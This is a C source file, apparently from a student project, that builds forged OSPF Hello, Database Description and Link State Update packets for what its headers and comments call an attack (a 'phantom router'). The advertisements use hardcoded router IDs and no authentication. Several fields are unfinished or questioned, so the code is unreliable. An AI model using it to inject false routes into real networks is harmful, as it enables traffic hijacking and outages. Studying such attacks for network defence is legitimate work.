#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>

#include "ospf.h"
#include "ospf_attack.h"
#include "checksum.h"

//?pedro                                    //verificar se tipo da variável é adequada
int build_basic_header_ospf(unsigned char buffer[BUFFER_LEN],
                                    char *local_ip,
                                    //char *dest_ip,
                                    __u8 packet_type) {

  // OSPF header
  int length = sizeof(struct ospf) + sizeof(struct ospf_hello);
  if(packet_type - 0x01) {
    length = sizeof(struct ospf) + sizeof(struct ospf_dd);
  }
  struct ospf *basic_header_ospf;
  basic_header_ospf = (struct ospf *) &buffer[sizeof(struct ether_header) + sizeof(struct ip)];
  basic_header_ospf->ospf_version = OSPF_VERSION;                           /* Version Number   */
  basic_header_ospf->ospf_type = packet_type;                           /* Packet Type      */
  /* HELLO 0x01  <=> DB Description 0x02  <=> LS Update 0x04 */
  basic_header_ospf->ospf_len = htons(length);   /* Packet Length    */
  basic_header_ospf->ospf_rid = inet_addr(local_ip);                        /* Router Identifier    */
  basic_header_ospf->ospf_aid = inet_addr("0.0.0.0");                       /* Area Identifier    */
  basic_header_ospf->ospf_cksum = 0x0000;                                   /* Check Sum      */
  basic_header_ospf->ospf_authtype = AU_NONE;                               /* Authentication Type    */
  basic_header_ospf->ospf_auth = 0;                              /* Authentication Field */

  basic_header_ospf->ospf_cksum = in_cksum((short unsigned int *)(buffer + sizeof(struct ether_header) + sizeof(struct ip)), length);
  return sizeof(struct ospf);
}


//?pedro                                     //verificar se tipo da variável é adequada
int build_hello_header_ospf(unsigned char buffer[BUFFER_LEN],
                                     char *local_ip//, char *dest_ip
                                     ) {

  // OSPF hello header
  struct ospf_hello *hello_header_ospf;
  hello_header_ospf = (struct ospf_hello *) &buffer[sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf)];
  hello_header_ospf->oh_netmask = inet_addr("255.255.255.0");               /* Network Mask     */
  hello_header_ospf->oh_hintv = HELLO_INTERVAL;                             /* Hello Interval (seconds) */
  /*OPTIONS DON'T OK*/
  hello_header_ospf->oh_opts = HELLO_OPTIONS;                               /* Options      */
  hello_header_ospf->oh_prio = HELLO_PRIORITY;                              /* Sender's Router Priority */
  hello_header_ospf->oh_rdintv = inet_addr("0.0.0.40");                       /* Seconds Before Declare Dead  */
  hello_header_ospf->oh_drid = inet_addr("192.168.3.1");                         /* Designated Router ID   */
  hello_header_ospf->oh_brid = inet_addr("0.0.0.0");                        /* Backup Designated Router ID  */
  hello_header_ospf->oh_neighbor = inet_addr("192.168.3.1");                                        /* Living Neighbors   */
  int swap;
  swap = build_basic_header_ospf(buffer, local_ip, 0X01); 			/* size_eth_ip, */
  swap = swap + build_lls_data_block(buffer, sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_hello));
  return sizeof(struct ospf_hello) + swap;
}


//?pedro                                               //verificar se tipo da variável é adequada
int build_database_description_header_ospf(unsigned char buffer[BUFFER_LEN],
                                    char *local_ip,
                                    unsigned long sequence_number,
                                    __u8 control) {

  // OSPF data base description header
  struct ospf_dd *database_description_header_ospf;
  database_description_header_ospf = (struct ospf_dd *) &buffer[sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf)];
  database_description_header_ospf->dd_mbz = htons(1500);                   /* Must Be Zero         */
  database_description_header_ospf->dd_opts = DD_OPTIONS;                   /* Options          */
  database_description_header_ospf->dd_control = control;                   /* Control Bits (DDC_* below)   */
  /* primeiro 0x07 = master coisas para enviar e comançando, segundo 0x03 = master e tem coisas para enviar, terceiro 0x01 eu sou o master */
  database_description_header_ospf->dd_seq = htonl(sequence_number);               /* Sequence Number      */
  int swap = build_basic_header_ospf(buffer, local_ip, 0x02);
  swap = swap + build_lls_data_block(buffer, sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_dd));
  return sizeof(struct ospf_dd) + swap;
}

int build_lls_data_block(unsigned char buffer[BUFFER_LEN], int pos){
  struct ospf_lls *lls_header_ospf;
  lls_header_ospf = (struct ospf_lls *) &buffer[pos];
  lls_header_ospf->data[0] = 0x0300f6ff;
  lls_header_ospf->data[1] = 0x04000100;
  lls_header_ospf->data[2] = 0x01000000;
  return 12;
}

//?pedro                                              //verificar se tipo da variável é adequada
int build_ls_update_header_ospf(unsigned char buffer[BUFFER_LEN],
                                    char *local_ip) {
  // OSPF Link State Update
  int length = sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf);
  struct ospf_lsu *lsu_header_ospf;
  lsu_header_ospf = (struct ospf_lsu *) &buffer[length];
  lsu_header_ospf->lsu_nads = inet_addr("0.0.0.1");                         /* # Advertisments This Packet  */

  // OSPF link state summary header
  length = length + sizeof(struct ospf_lsu);
  struct ospf_lss *lss_header_ospf;
  lss_header_ospf = (struct ospf_lss *) &buffer[length];
  lss_header_ospf->lss_age = LSS_AGE;                                       /* Time (secs) Since Originated ?pedro I can't know if fixed value */
  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
  lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
  // TODO: CHECKSUM: lss_header_ospf->lss_cksum;  /* ?pedro Fletcher Checksum of LSA */
  lss_header_ospf->lss_len = LSS_LENGTH;    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/

  // OSPF Network Links Advertisement
  length = length + sizeof(struct ospf_lss);
  struct  ospf_na *na_header_ospf;
  na_header_ospf = (struct ospf_na *) &buffer[length];
  na_header_ospf->na_mask = inet_addr("255.0.0.0");                         /* Network Mask     */
  na_header_ospf->na_rid[0] = inet_addr("200.0.0.1");                       /* ID of first  Attached Routers  */
  na_header_ospf->na_rid[1] = inet_addr("100.0.0.1");                       /* ID of second Attached Routers  */

  int swap = build_basic_header_ospf(buffer, local_ip, 0X04);

  return sizeof(struct ospf_lss) + sizeof(struct ospf_lsu) + sizeof(struct ospf_na) + swap;
}
